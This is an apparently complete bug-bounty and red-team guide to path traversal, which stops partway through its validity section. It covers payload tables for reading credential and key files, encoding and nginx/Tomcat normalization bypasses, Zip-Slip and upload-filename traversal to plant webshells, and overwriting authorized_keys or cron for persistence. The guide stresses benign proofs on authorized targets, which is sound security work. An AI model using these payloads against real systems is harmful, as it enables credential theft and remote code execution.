# Path / Directory Traversal — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any feature where a client-controlled value becomes a **filesystem path the server READS, SERVES, or WRITES** *without executing it as code* — file **download/serve** endpoints (`?file=`, `/download?path=`, `sendFile`, `X-Sendfile`), static asset routing (nginx `alias`, Tomcat/Java, Express `static`), **archive extraction** (zip/tar → **Zip-Slip**), **upload path/filename** handling (attacker sets where the file lands), template/report/PDF path params that read (not include), and web-server/framework **path-normalization** gaps (`..;/`, `%2e`, UNC, off-by-slash)
**Platforms:** Linux & Windows targets; Kali/WSL for tooling
**Companion files in this folder:**
- `PATH_TRAVERSAL_ARSENAL.md` — traversal + encoding + write-side + server-normalization payloads (copy-paste)
- `PATH_TRAVERSAL_CHECKLIST.md` — the testing-order checklist you tick per sink
- `PATH_TRAVERSAL_REPORT_TEMPLATE.md` — the report skeleton that gets paid (read vs write variants)
- `Path_Traversal_Zero_to_Expert.md` — study + field-reference Q&A
- `poc/` — runnable tooling (traversal read-fuzzer, Zip-Slip archive builder, write-path prober)

> **This kit is the sibling of `LFI/` and `RFI/`, deliberately scoped to what they don't own.** The **`LFI/` kit owns "traversal into an `include()`/`require()` that EXECUTES the file → RCE"** (log poisoning, `php://filter`, wrappers). **This kit owns the rest of the traversal family:** reading/serving files the app never executes (download endpoints, static serving, misconfigured proxies), **WRITING files outside the intended directory** (Zip-Slip, extraction, upload-path traversal → webshell/overwrite), and the **web-server / framework path-normalization bypasses** that reach both. If the file you reach is *interpreted as code*, jump to the LFI kit for the RCE escalation; if it's *read, served, or written as bytes*, you're in the right place.

---

> ### ⚡ READ THIS FIRST — why most traversal reports underpay (or get closed)
> 1. **`/etc/passwd` is proof, not impact.** Reading `passwd` (or `win.ini`) confirms traversal on a *read* sink — it's a **Medium** by design (a non-secret file). The bounty is **(a)** reading real **secrets** (`.env`, app config with DB/cloud creds, private keys, `web.config`, source, session/token files, `~/.aws/credentials`, k8s serviceaccount tokens) or **(b)** the **WRITE** side — dropping a file where it becomes **RCE** (§11–§14). Climb from "I can read a file" to "I can read your secrets" or "I can write your filesystem."
> 2. **The WRITE side is the headline this kit owns.** A traversal in **archive extraction (Zip-Slip)**, an **upload filename/path**, or any "save file to <name>" flow lets you **write outside the target dir** → drop a **webshell** in the webroot, overwrite **`~/.ssh/authorized_keys`**, a **cron**/systemd unit, a **`.bashrc`**, a config, or a CI file → **RCE/persistence — Critical** (§12–§14). Write-traversal routinely out-pays read-traversal.
> 3. **Read-without-include is still High when it hits secrets.** A pure `readfile`/`sendFile`/static-serve traversal never executes, so no wrapper/log-poison RCE — but reading `config`, `.env`, cloud creds, source, or **another user's files** is **High**, and the creds you read often lead to RCE/cloud takeover *elsewhere* (§10). Don't undersell a read sink because it "can't do `php://filter`."
> 4. **The bypass is server-layer, not just app-layer.** Many traversals live in the **web server / framework / proxy**, not the code: **nginx `alias` off-by-slash**, **Tomcat/Java `..;/`**, **`%2e%2e%2f` / double-encoding** decoded by the server, **Windows `..\`/UNC `\\`**, path **normalization** order-of-operations. These reach files even when the app "validated" the input (§5–§8).
> 5. **Know read vs write vs include — they pay differently.** *Read/serve* → disclosure (Med–High). *Write* → RCE/overwrite (High–Crit). *Include/execute* → that's LFI (jump to that kit). Identify which sink you have in Phase 1; it decides the whole playbook.
>
> **Where the money is (memorize this order):** ① **write-traversal (Zip-Slip / upload-path / save-as) → webshell or key/cron overwrite → RCE/persistence — Critical** → ② **read-traversal → secrets (`.env`/config/keys/cloud creds/source) → creds → pivot/RCE — High–Critical** → ③ **read-traversal → other users' files / PII / session-token files — High** → ④ **server-normalization traversal reaching sensitive static files (`web.config`, `.git/`, backups) — High** → ⑤ **`/etc/passwd`-class non-secret read / bare traversal confirmation — Medium**.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)**

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [Traversal Anatomy — Read / Serve / Write / (Include) & Why It Pays](#2-traversal-anatomy)
3. [Reconnaissance — Find Every Path Sink](#3-reconnaissance--find-every-path-sink)
4. [Baseline — Confirm Traversal & Classify the Sink (read vs write vs include)](#4-baseline--confirm-traversal--classify-the-sink)

**PART II — REACHABILITY & BYPASS (work in this order)**
5. [Escaping the Directory — the Traversal Core](#5-escaping-the-directory--the-traversal-core)
6. [Encoding & Filter Bypasses](#6-encoding--filter-bypasses)
7. [Defeating Prefix / Suffix / Allowlist Constraints](#7-defeating-prefix--suffix--allowlist-constraints)
8. [Web-Server & Framework Normalization Bypasses (nginx alias, `..;/`, UNC)](#8-web-server--framework-normalization-bypasses)

**PART III — EXPLOITATION BY IMPACT (where the money is)**
9. [Mapping the Sink to an Attack](#9-mapping-the-sink-to-an-attack)
10. [Read/Serve Traversal → Secret & Source Disclosure ⭐](#10-readserve-traversal--secret--source-disclosure)
11. [Read Traversal → Other Users' Files / Cross-Tenant / PII](#11-read-traversal--other-users-files)
12. [WRITE Traversal — Zip-Slip (Archive Extraction) → RCE ⭐](#12-write-traversal--zip-slip)
13. [WRITE Traversal — Upload Path/Filename → Webshell/Overwrite → RCE ⭐](#13-write-traversal--upload-pathfilename)
14. [WRITE Traversal — Save/Export/Log Path → Overwrite Keys/Cron → RCE/Persistence ⭐](#14-write-traversal--saveexportlog-path)
15. [Windows & Other Stacks (Java/Node/Python/.NET/Go)](#15-windows--other-stacks)

**PART IV — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
16. [The Validity-First Mindset](#16-the-validity-first-mindset)
17. [False Positives — STOP reporting these](#17-false-positives--stop-reporting-these-auto-reject-list)
18. [Severity Calibration](#18-severity-calibration--how-triagers-really-rate-traversal)
19. [Impact-Escalation Playbooks — "you found X, now do Y"](#19-impact-escalation-playbooks--you-found-x-now-do-y)
20. [Building a Professional, Safe PoC](#20-building-a-professional-safe-poc)
21. [Reporting, CWE/CVSS & De-duplication](#21-reporting-cwecvss--de-duplication)
22. [Automation & Red-Team Notes](#22-automation--red-team-notes)

**Appendices**
- [Appendix A — Traversal Workflow Cheat Sheet](#appendix-a--traversal-workflow-cheat-sheet)
- [Appendix B — Traversal Decision Tree](#appendix-b--traversal-decision-tree)
- [Appendix C — Important Links & References](#appendix-c--important-links--references)

---

# Master Testing Sequence — The Testing Order

> **This is the spine.** Work top-to-bottom. Numbered sections (1–22) are reference detail; this is the order you execute.

```
PHASE 0  RECON            → find every PATH sink: download/serve endpoints, static routing, archive-extract, upload
                            filename/path, save/export/report path params (§3)
PHASE 1  BASELINE  ★      → confirm traversal AND classify: does the sink READ/SERVE, WRITE, or INCLUDE(→LFI kit)? (§4)
PHASE 2  REACH/BYPASS     → escape the directory (§5) · encoding/filter bypass (§6) · beat prefix/suffix/allowlist (§7) ·
                            server/framework normalization: nginx alias, ..;/, UNC (§8)
PHASE 3  IMPACT  ⭐ (money)→ map sink → attack (§9):
                            READ  → secrets/source (§10) · other users' files/PII (§11)
                            WRITE → Zip-Slip → RCE (§12) · upload-path → webshell/overwrite (§13) ·
                                    save/export/log path → keys/cron overwrite → RCE/persistence (§14)
                            (INCLUDE/EXECUTE → hand to the LFI kit for wrapper/log-poison/filter-chain RCE)
PHASE 4  VALIDATE→REPORT  → validity (§16) · false-positive filter (§17) · severity+CVSS+CWE-22/23/24/36 (§18) ·
                            SAFE PoC: benign marker files, own account, no destructive overwrite (§20) · dedup (§21)
```

**Phase-by-phase, with the deliverable before moving on:**

1. **PHASE 0 — Recon.** Enumerate every **path sink** — file download/serve, static routing, archive upload/extract, upload filename/path, save/export/report path (§3). *Deliverable:* a list of `(endpoint, param, sink-direction guess)`.
2. **PHASE 1 — Baseline ⭐.** Confirm you can influence the path AND **classify the sink**: READ/SERVE (bytes returned), WRITE (a file is created/overwritten), or INCLUDE/EXECUTE (→ hand to the **LFI kit**) (§4). *Deliverable:* a confirmed traversal + its direction.
3. **PHASE 2 — Reach/bypass.** Escape the directory (§5), defeat encoding/filters (§6), beat prefix/suffix/allowlist (§7), and use server/framework normalization bugs (§8). *Deliverable:* attacker-chosen path reaching a target file location.
4. **PHASE 3 — Impact ⭐.** READ → secrets/source (§10) or other users' files (§11); WRITE → Zip-Slip RCE (§12), upload-path webshell/overwrite (§13), save/export overwrite of keys/cron (§14). *Deliverable:* a demonstrated impact (a secret read / a benign file written outside root / a proven RCE path).
5. **PHASE 4 — Validate → report.** Apply validity & FP filters (§16/§17), set CVSS/CWE (§18), keep the PoC **benign** (marker files, no destructive overwrite) (§20), de-dup, write it (§21). *Deliverable:* the submitted report.

Reference anytime: payloads → `PATH_TRAVERSAL_ARSENAL.md`; checklist → `PATH_TRAVERSAL_CHECKLIST.md`; scripts → `poc/`; playbooks **§19**. **Include/execute sink → `LFI/` kit.**

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

| Tool | Job |
|------|-----|
| **Burp Suite** (Repeater/Intruder) | tamper path params, replay uploads, inspect served bytes & write responses; the core tool |
| **curl** | quick CLI read tests (`--path-as-is` to stop curl collapsing `../`), raw uploads, header tricks |
| **`poc/pt_read_fuzz.py`** | spray the traversal+encoding matrix at a read/serve param; detect a marker (control-baselined, low-FP) |
| **`poc/zipslip_build.py`** | build a **benign** Zip-Slip archive (a marker file with a `../` path) to test extraction traversal |
| **`poc/write_probe.py`** | test an upload/save path param for out-of-dir write with a benign marker + verify where it landed |
| **`ffuf` / `feroxbuster`** | fuzz download/serve endpoints and traversal depth at scale |
| **`nuclei` (`-tags lfi,traversal`)** | template-based traversal detection across many hosts |
| **an OOB host (interactsh)** | confirm blind write/read side effects and any fetch behavior |
| **a target directory you can read/write in the app** | e.g. your own upload area / export dir, for a benign write PoC |

```bash
# Kali/WSL — read test WITHOUT curl normalizing the dots away:
curl --path-as-is -s "https://target/download?file=../../../../etc/passwd"
# nginx alias off-by-slash probe (note the missing slash):
curl -s "https://target/static../etc/passwd"
python3 poc/pt_read_fuzz.py -u "https://target/download?file=FUZZ" --read /etc/passwd --marker "root:x:0:0"
python3 poc/zipslip_build.py --out evil.zip --name "../../../../tmp/pt-poc-<rand>.txt" --content "benign-poc"
```
> **`--path-as-is` matters.** Without it, curl (and browsers) collapse `../` client-side, so you never send the traversal. Use `--path-as-is` (curl) or Burp Repeater (which sends bytes verbatim) so the `../` reaches the server.

---

# 2. Traversal Anatomy

## 2.1 What it is
The app takes a client value and uses it as (part of) a **filesystem path**. If it doesn't fully canonicalize + confine that path to an intended base directory, `../` (or an absolute path, or an OS/encoding variant) lets you **step out of the base dir** and reach arbitrary files — to **read** them, **serve** them, or **write** them. It's CWE-22 (Path Traversal) and its relatives CWE-23 (relative), CWE-24/25 (`../`/`..\`), CWE-36 (absolute path), CWE-59 (link following).

## 2.2 The sink DIRECTIONS (this decides everything)
```
READ / SERVE   readfile/fopen/file_get_contents/sendFile/X-Sendfile/static-serve → returns file BYTES → disclosure. §10/§11
WRITE          save-as / move_uploaded_file / archive EXTRACTION / fs.writeFile / log path → creates/overwrites a file. §12–§14 ⭐
INCLUDE/EXEC   include/require/template-eval that RUNS the file → RCE.  ==> NOT this kit: use the LFI/RFI kit.
DELETE/OTHER   unlink/rename with a path param → destructive traversal (DoS / tamper). (rare; note it)
```

## 2.3 The sources (where the path comes from)
```
QUERY / BODY   ?file= ?path= ?download= ?doc= ?name= ?filename= ?template= ?report= ?img= ?attachment= ?key= ?resource=
PATH SEGMENT   /files/<name>   /download/<path>   /static/<...>   /api/v1/files/<id-or-name>
UPLOAD META    the multipart "filename" field; a JSON "path"/"dest" field; archive ENTRY names (zip/tar) — §12/§13
HEADERS        X-Sendfile / X-Accel-Redirect (if user-influenced), Destination (WebDAV), Content-Disposition-derived saves
SERVER CONFIG  nginx `alias`/`root` off-by-slash; Tomcat/Java `..;/`; proxy path passthrough — §8
```

## 2.4 Why it pays
- **Read → secrets.** Config/`.env`/keys/cloud-creds/source read directly, then reused to pivot or get RCE elsewhere.
- **Write → RCE.** A single benign-looking upload/extract writes a webshell into the webroot or overwrites `authorized_keys`/cron.
- **It hides in infrastructure.** Server/framework normalization bugs bypass "the app validated it" — a whole bug class the code review misses.
- **Cross-tenant reads.** Traversal in a per-user file store reads *other users'* documents → mass PII/ATO.

> **The mental model:** traversal = **the app trusts your string as a path and forgets to confine it to a directory.** Severity = *the direction* (read=disclosure, write=RCE/overwrite) × *what file you reach* (a secret, someone else's data, or an executable location).

---

# 3. Reconnaissance — Find Every Path Sink

```
□ DOWNLOAD / SERVE: any "download", "export", "attachment", "view file", "preview", "get document", avatar/image-by-name,
   invoice/PDF/report fetchers, backup downloaders → READ sinks (§10). Note params: file/path/name/doc/download/key.
□ STATIC ROUTING: URLs under /static /assets /files /media /public /cdn — test server-normalization traversal (§8).
□ ARCHIVE UPLOAD/EXTRACT: "import", "upload zip", theme/plugin install, restore-from-backup, "bulk import", avatar-zip,
   any feature that UNZIPS/UNTARs user input → Zip-Slip WRITE (§12). ⭐ the highest-value recon hit.
□ UPLOAD FILENAME/PATH: any upload where you control the filename or a dest/path field → write-path traversal (§13).
□ SAVE / EXPORT / LOG PATH: "save report to", "export to path", log-file naming, "output filename" → write sinks (§14).
□ TEMPLATE/REPORT PARAMS that READ a file (not include) → read sink (§10). If it INCLUDES/executes → LFI kit.
□ PARAM DISCOVERY: gau/katana + gf; Arjun/Param Miner for hidden file/path/name/dest params.
□ SOURCE HINTS: JS/APIs referencing file paths; error messages leaking absolute paths (tells you the base dir & OS).
```
> **If this → then that:** an **"import ZIP" / restore / theme-install** feature exists → that's your first and highest-value target (**Zip-Slip write → RCE**, §12). A **download/serve** endpoint with a `file=`/`path=` param → read-traversal to secrets (§10). Files served straight from **`/static`** → test **server-normalization** traversal (§8), not just app-param traversal.

---

# 4. Baseline — Confirm Traversal & Classify the Sink

**Do this before chasing impact.** Prove you influence the path AND determine the direction (read/write/include).

## 4.1 Confirm traversal (read sinks)
```
1. Baseline the normal value: ?file=welcome.txt → note the exact bytes/length/status.
2. Same-dir control:          ?file=./welcome.txt  → same response? (proves the value IS the path)
3. Traverse to a known file:  ?file=../../../../../../etc/passwd   (Linux)   ?file=..\..\..\windows\win.ini (Windows)
   Use curl --path-as-is / Burp so the ../ actually transmits.
4. Depth sweep: 1..12 levels of ../ (you rarely know the base depth) — or jump straight to an absolute path (§5).
```

## 4.2 Classify the sink (decides the playbook)
```
□ Bytes of a file come back                      → READ/SERVE sink → §10 (secrets/source) / §11 (other users' files).
□ A file is CREATED/OVERWRITTEN on the server     → WRITE sink → §12 (zip-slip) / §13 (upload-path) / §14 (save/export).
□ The file's CONTENT is EXECUTED/rendered as code → INCLUDE sink → ***go to the LFI/RFI kit*** (wrapper/log-poison RCE).
□ Absolute path accepted (/etc/passwd with no ../) → CWE-36; skip the depth sweep, go straight to targets.
□ Only same-dir names allowed / value not a path  → likely not traversal; keep hunting.
```

> **Don't stop at "`../` changes the response."** That's Phase 1. The report is the **impact**: a secret/source/cross-user file read (§10/§11), or a benign file **written outside the base dir** proving you could drop a webshell/overwrite a key (§12–§14). Bare `/etc/passwd` on a read sink is **Medium** (§17).

---

# PART II — REACHABILITY & BYPASS (work in this order)

> Full payload lists are in `PATH_TRAVERSAL_ARSENAL.md`.

# 5. Escaping the Directory — the Traversal Core

```
RELATIVE, VARYING DEPTH   ../etc/passwd  ../../etc/passwd  ...  ../../../../../../../../etc/passwd  (over-traverse: extra
                          ../ are harmless once at /, so 8–12 deep almost always reaches root).
ABSOLUTE PATH             /etc/passwd    file:///etc/passwd    C:\windows\win.ini    \\?\C:\...\   (skips depth guessing).
WINDOWS SEPARATORS        ..\..\..\windows\win.ini    ..%5c..%5cwin.ini    mix / and \ (Windows accepts both).
NESTED / NON-RECURSIVE     ....//   ....\/   ..././   ....\\   → survives a ONE-PASS strip of "../" (the stripped result
                          re-forms "../").  The single most common filter bypass.
TRAILING NULL (legacy)     ../../etc/passwd%00.png   (old PHP<5.3.4 / some native calls) — defeats a forced suffix.
DOT-SEGMENT VARIANTS       ../ vs ..%2f vs %2e%2e/ vs ..\  (§6 for full encoding).
```
> **If this → then that:** a filter **strips `../` once** → use **`....//`** (or `..../\`, `....\/`) so the remnant collapses back to `../`. Depth unknown → **over-traverse** (8–12 `../`) or use an **absolute path**. Windows target → `..\`/`..%5c` and drive-absolute `C:\`.

---

# 6. Encoding & Filter Bypasses

```
URL ENCODE            ..%2f  %2e%2e%2f  ..%5c  %2e%2e%5c            (server/app decodes → ../ or ..\)
DOUBLE ENCODE         %252e%252e%252f  ..%255c                     (beats decode-once; the proxy decodes to %2e.., app to ..)
OVERLONG / UTF-8      %c0%ae%c0%ae%c0%af  %e0%80%ae   ..%c1%9c      (legacy IIS/Unicode; classic ../ and ..\ )
16-BIT UNICODE        %u002e%u002e%u2215  %uff0e (fullwidth dot)     (older Windows/IIS parsers)
MIXED / PARTIAL       ..%2f..%2f  ..%c0%afetc  .%2e/  %2e%2e/        (mix raw + encoded to slip regexes)
STRIP-AND-REFORM      ....//   ..;/   ;/../                          (non-recursive filters + path-param tricks)
NULL / TRUNCATION     %00  (legacy)  · long-path truncation (append /./././… to drop a forced suffix on old PHP)
CASE / DOTS           On Windows: trailing dots/spaces are trimmed (file.php... == file.php); ADS name::$DATA.
```
> **If this → then that:** raw `../` is filtered but the value is **URL-decoded** server-side → **`..%2f`**; a WAF/proxy sits in front → **double-encode** (`%252e%252e%252f`). Legacy IIS/older stacks → **overlong UTF-8** (`%c0%ae%c0%ae%c0%af`). The decode happens at a *different layer* than the validation — that gap is the bug.

---

# 7. Defeating Prefix / Suffix / Allowlist Constraints

When the app forces a directory prefix, an extension suffix, or an allowlist:

```
FORCED PREFIX (base dir prepended):  the code does open(BASE + "/" + input) → your input just needs ../ back out:
    input = ../../../../etc/passwd     (BASE + "/../../../../etc/passwd" resolves to /etc/passwd)
FORCED SUFFIX / EXTENSION (".png"/".pdf" appended):
    - Null byte (legacy):   ../../etc/passwd%00.png
    - Path truncation (legacy PHP): ../../etc/passwd/././././…(4096+)  → the appended ".png" falls off the end.
    - A file that ENDS with the suffix: reach a real *.pdf/*.log you want, or a target whose name ends in the ext.
    - Wrapper/interpretation that ignores suffix (server-dependent).
ALLOWLIST (name must be in a set):
    - Traverse FROM an allowed value: ?file=allowed.txt/../../../etc/passwd  (if it concatenates a subpath).
    - Prefix/substring checks: ?file=/var/www/allowed/../../../etc/passwd
    - "must start with /base": /base/../../../etc/passwd
BLOCKLIST (denies "etc/passwd"/"../"): encode (§6), nest (....//), or target a DIFFERENT sensitive file not on the list.
```
> **If this → then that:** the app **prepends a base dir** → you don't need an absolute path, just enough `../` to climb out of it. It **appends `.pdf`** → on modern stacks the null byte is dead, so **pick a target that already ends in `.pdf`** (or a log/backup), or find a legacy truncation. It **allowlists names** → traverse *from* an allowed name if the code concatenates (`allowed/../../secret`).

---

# 8. Web-Server & Framework Normalization Bypasses

**The traversal that isn't in the app code** — it's in the server/proxy/framework. Test these on static routes even when app params look safe.

```
NGINX "alias" OFF-BY-SLASH (very common):
    location /static { alias /var/www/app/static/; }   ← note: location has NO trailing slash, alias DOES.
    Request:  /static../  →  resolves to /var/www/app/  → then /static../../etc/passwd → /etc/passwd.
    Probe:    /static../  , /assets../ , /img../ , /media../  (the missing-slash off-by-one).
TOMCAT / JAVA  "..;/" and ";" path params:
    /app/..;/..;/WEB-INF/web.config   /app/..;/manager  → ";" segments confuse the security constraint vs the file mapper.
    Also  /%2e%2e/ , /..%00/ , /..;/  on Spring/Tomcat/Jetty.
ENCODED SLASH AT PROXY:
    %2f and %5c not decoded by the proxy but decoded by the app (or vice-versa) → /api/%2e%2e%2f... reaches internal paths.
SPRING / EXPRESS STATIC:
    Express express.static historically mishandled encoded traversal; Spring `..%2f`, `..;` on some versions.
    "static" middlewares that resolve AFTER decoding → %2e%2e%2f.
IIS / .NET:
    ..%c0%af , ..%255c , trailing dot/space, ::$DATA (ADS) to read source of .aspx/.asmx.
DOUBLE-DECODE PROXIES / CDNs:
    a fronting CDN normalizes once, the origin decodes again → double-encoded traversal reaches the origin.
```
> **If this → then that:** files are served from **`/static`** (nginx) → test **`/static../`** (the alias off-by-slash) — it reaches the parent dir even when every app param is locked down. A **Java/Tomcat** app → **`..;/`** (semicolon path segments) bypasses the servlet security constraint to read **`WEB-INF/`** (source, `web.xml`, DB creds). A **CDN in front** → double-encoding. These are server bugs; cite the exact server + version.

---

# PART III — EXPLOITATION BY IMPACT (where the money is)

> Read with your **own** access; for WRITE sinks use **benign marker files** and **never destructively overwrite** a real file (§20).

# 9. Mapping the Sink to an Attack

```
Sink (from §4)                              Attack                                       Severity ceiling
──────────────────────────────────────────────────────────────────────────────────────────────────────────
READ/serve → secrets/source                 .env/config/keys/cloud-creds/source read     High–Critical (creds→RCE)   §10
READ/serve → other users' / cross-tenant     PII / documents / session-token files        High                        §11
WRITE via archive extraction (Zip-Slip)      webshell in webroot / overwrite key/cron      Critical (→ RCE)            §12 ⭐
WRITE via upload filename/path               webshell / overwrite config/key               Critical (→ RCE)            §13 ⭐
WRITE via save/export/log path               overwrite authorized_keys / cron / .bashrc    Critical (→ RCE/persist)   §14 ⭐
READ non-secret (/etc/passwd, win.ini)       traversal confirmation                        Medium                      §10
INCLUDE/EXECUTE                              → LFI kit (wrapper/log-poison/filter-chain)   Critical                    (LFI)
```

# 10. Read/Serve Traversal → Secret & Source Disclosure ⭐

A read sink never executes the file, so no wrapper/log-poison RCE — but reading the *right* file is High–Critical and often leads to RCE elsewhere.

```
HIGH-VALUE READ TARGETS (Linux):
  /var/www/<app>/.env  ·  config.php / settings.py / application.yml / appsettings.json  ·  wp-config.php
  ~/.aws/credentials  ·  ~/.ssh/id_rsa  ·  /root/.ssh/id_rsa  ·  /proc/self/environ (env secrets)
  /var/run/secrets/kubernetes.io/serviceaccount/token  ·  /proc/self/cgroup (container hints)
  the app's SOURCE (read your way to the code → find more bugs)  ·  DB files (sqlite)  ·  backup files (.bak/.old/.zip)
HIGH-VALUE READ TARGETS (Windows):
  web.config  ·  <app>\appsettings.json  ·  C:\inetpub\...\web.config  ·  C:\Windows\System32\config\* (SAM etc. if perms)
  unattend.xml / sysprep.inf  ·  IIS logs  ·  source of .aspx via ::$DATA
ESCALATE THE CREDS: DB creds → DB → dump/RCE ; cloud creds → metadata/cloud takeover (SSRF kit) ; SSH key → shell ;
  app source → find auth-bypass/secret keys → sign JWTs (JWT kit) / more RCE.
```
> **If this → then that:** you can read arbitrary files → go straight for **`.env`/app config → DB/cloud creds** (not `/etc/passwd`). Cloud creds → **cloud metadata / account takeover** (SSRF kit). An **SSH private key** → shell. **App source** → mine it for signing keys/hardcoded secrets (JWT kit) and more bugs. Reading the secret is High; the pivot it enables is often Critical — report the full chain.

---

# 11. Read Traversal → Other Users' Files / Cross-Tenant / PII

When files are stored per-user/tenant and the path is user-influenced, traversal (or even just an ID/path swap) reads *others'* data:

```
□ Per-user document store: /files/<userid>/<name> → ../<otherid>/<name> or ../../<otherid>/secret.pdf → cross-user read.
□ Tenant-scoped storage: /t/<tenant>/export.csv → ../<other-tenant>/export.csv → cross-tenant breach.
□ Session/token files: /tmp/sess_<id>, framework session dirs → read another user's session → ATO (cross-ref LFI session, ATO kit).
□ Signed-URL / object-key traversal: ?key=uploads/me/../others/... in an S3-proxy → other users' objects.
```
> **If this → then that:** the read sink is a **per-user/tenant file store** → traversal (or path-swap) reads **other users' files** → this is often reported as **IDOR-via-traversal** and pays as **High** (mass PII / cross-tenant). If you can read **session/token files**, that's **ATO** — cross-ref the IDOR & Account-Takeover kits.

---

# 12. WRITE Traversal — Zip-Slip (Archive Extraction) → RCE ⭐

**The flagship write-traversal.** If the app **extracts a user-supplied archive** (zip/tar/jar/war/apk) and uses each entry's name as the output path without confining it, an entry named `../../../../var/www/html/shell.php` **writes outside the extraction dir** → webshell/overwrite → RCE.

```
1. Find the sink: any "import zip", "restore backup", "install theme/plugin", "bulk upload", avatar-zip, "upload .tar.gz".
2. Build a benign PoC archive with a TRAVERSING entry name (poc/zipslip_build.py):
     entry name: ../../../../tmp/pt-poc-<rand>.txt        content: "zip-slip PoC <handle> <program> <ts>"
   Confirm SAFELY first by writing a benign marker to a world-writable/own dir you can then read back.
3. Escalate (only if authorized + safe): target an EXECUTABLE location:
     ../../../../var/www/html/pt-<rand>.php    (webshell in webroot → request it → RCE)
     ../../../../<app>/routes/evil.js  ·  a WEB-INF/ class  ·  a config the app reloads
   Prefer proving WRITE with a benign marker + describing the RCE; only drop a real shell on your own instance.
4. tar/symlink variants: a tar entry that is a SYMLINK to /etc or an absolute path; nested archive traversal.
```
> **If this → then that:** the app **unzips user input** and you can name an entry `../../…/webroot/x.php` that lands there → **Zip-Slip → RCE (Critical)**. Prove it **benignly**: extract a marker to a safe path you can read back (shows the write escaped the dir), then *describe* the webshell escalation. Snyk's 2018 "Zip-Slip" disclosure hit dozens of libraries — this is real and widespread. Cross-ref the FileUpload kit for the upload half.

---

# 13. WRITE Traversal — Upload Path/Filename → Webshell/Overwrite → RCE ⭐

When you control the **upload filename** or a **destination path** field, traversal moves the written file out of the safe upload dir:

```
1. Control the filename: multipart  filename="../../../../var/www/html/pt-<rand>.php"  (or a JSON "path"/"dest" field).
2. Or control a dest param:  {"dest":"../../public/pt-<rand>.php"}  ·  ?path=../../webroot/x.jsp
3. Land it in an executable/served location → request it → RCE (cross-ref FileUpload kit for content/extension bypass).
4. OVERWRITE existing files (often more reliable than dropping new ones): overwrite a served .js/.html the app already
   loads, a config, ~/.ssh/authorized_keys, a cron file, a CI/pipeline file → RCE/persistence (§14).
```
> **If this → then that:** the upload keeps your **filename** and you can put `../` in it → write a **webshell** into the webroot (Critical) *or* **overwrite** a file the app already trusts/serves. This overlaps the **FileUpload kit** (which owns content-type/extension/magic-byte bypass) — use both: this kit gets the file *out of the upload dir*, FileUpload gets it *executable*.

---

# 14. WRITE Traversal — Save/Export/Log Path → Overwrite Keys/Cron → RCE/Persistence ⭐

Any "write a file to <path>" feature — export, report-save, log-file naming, backup output, "download to server" — with a traversable path lets you **overwrite security-critical files**:

```
HIGH-VALUE WRITE/OVERWRITE TARGETS (Linux):
  ~/.ssh/authorized_keys        → add YOUR key → SSH login → RCE.
  /etc/cron.d/x  ·  ~/.bashrc  ·  a systemd unit  ·  /var/spool/cron/<user>  → scheduled command exec.
  the app's config / a served .php/.jsp/.js in the webroot → webshell / logic tamper.
  a CI/pipeline file (.gitlab-ci.yml, Jenkinsfile) in a repo the server builds → RCE on the runner.
HIGH-VALUE (Windows):
  a Startup-folder script  ·  a served .aspx  ·  a scheduled-task XML  ·  web.config (→ handler → RCE).
CONTENT CONTROL: you usually need to control the file CONTENT too (the export body / uploaded bytes). If content is fixed,
  target files where ANY content helps (append to authorized_keys, a log the app later executes, etc.).
```
> **If this → then that:** a **save/export** path is traversable and you control the **content** → overwrite **`~/.ssh/authorized_keys`** (add your key → SSH → RCE) or a **cron**/served-script file → **Critical RCE/persistence**. If you *don't* control content, look for an **append**-style write to `authorized_keys` or a file whose mere presence/content-shape triggers execution. Prove with a **benign marker write to a safe path**; never destroy a real key/config.

---

# 15. Windows & Other Stacks (Java/Node/Python/.NET/Go)

```
WINDOWS:  ..\  and  ..%5c  ; drive-absolute  C:\  ; UNC  \\attacker\share\  (traversal → SMB fetch → creds/SSRF-like) ;
          trailing dot/space trim ; Alternate Data Streams  file.aspx::$DATA (read .NET source) ; 8.3 short names.
JAVA:     ..;/ (Tomcat/servlet) ; WEB-INF/ source & web.xml ; ZipEntry Zip-Slip (the original Snyk class) ;
          new File(base, userInput) w/o getCanonicalPath confinement ; Spring Resource path handling.
NODE:     path.join(base, userInput) does NOT confine (../ escapes) unless path.resolve+startsWith check ; express.static
          historical decode bugs ; fs.writeFile/readFile with user path ; tar/adm-zip extraction (Zip-Slip).
PYTHON:   os.path.join(base, user) — an ABSOLUTE user path REPLACES base (os.path.join('/a', '/etc/passwd') == '/etc/passwd')!
          zipfile.extractall / tarfile.extractall (Zip-Slip; CVE-2007-4559 tar) ; send_file/Flask static.
.NET:     Path.Combine(base, user) — an absolute/rooted user path IGNORES base (same trap as Python) ; ::$DATA ; web.config.
GO:       filepath.Join cleans but doesn't confine ; http.ServeFile has some protection but path.Clean gaps exist ;
          archive/zip + os.Create without confinement (Zip-Slip).
```
> **If this → then that:** a **Python/.NET** target using `os.path.join`/`Path.Combine` → try an **absolute path** as the input (`/etc/passwd`, `C:\...`) — these functions **discard the base dir** when the second arg is absolute (a language-level foot-gun, not even needing `../`). **Java/Tomcat** → `..;/` for `WEB-INF/`. Any extractor (Java `ZipEntry`, Python `extractall`, Node `adm-zip`) → **Zip-Slip** (§12).

---

# PART IV — VALIDITY, SEVERITY & REPORTING

# 16. The Validity-First Mindset

## 16.1 The four questions a triager asks (answer them in your report)
1. **Is the path attacker-controlled past the base dir?** Show the `../`/absolute/normalization payload reaching a file **outside** the intended directory — not just a same-dir name.
2. **Read or write, and what did it reach?** READ → *which secret/source/cross-user file* (show the sensitive bytes, redacted). WRITE → *a benign file landed outside the base dir* (prove the escape), and *what executable location it could reach*.
3. **What's the concrete impact?** Secret disclosure → creds → pivot/RCE; cross-tenant PII; or write → webshell/overwrite → RCE/persistence. Name it.
4. **Reproducible & in scope?** Exact request/upload + the payload + the evidence (the read bytes / the written marker's location / the RCE proof on your own instance).

## 16.2 The "read vs write vs include" rule (most important)
| You have | Standalone verdict | Becomes valuable when… |
|---|---|---|
| `/etc/passwd` / `win.ini` read (non-secret) | Medium | …you read `.env`/config/keys/source/cloud-creds instead (§10). |
| Read of app secrets/source | **High–Critical** | …the creds enable DB dump / cloud takeover / RCE elsewhere. |
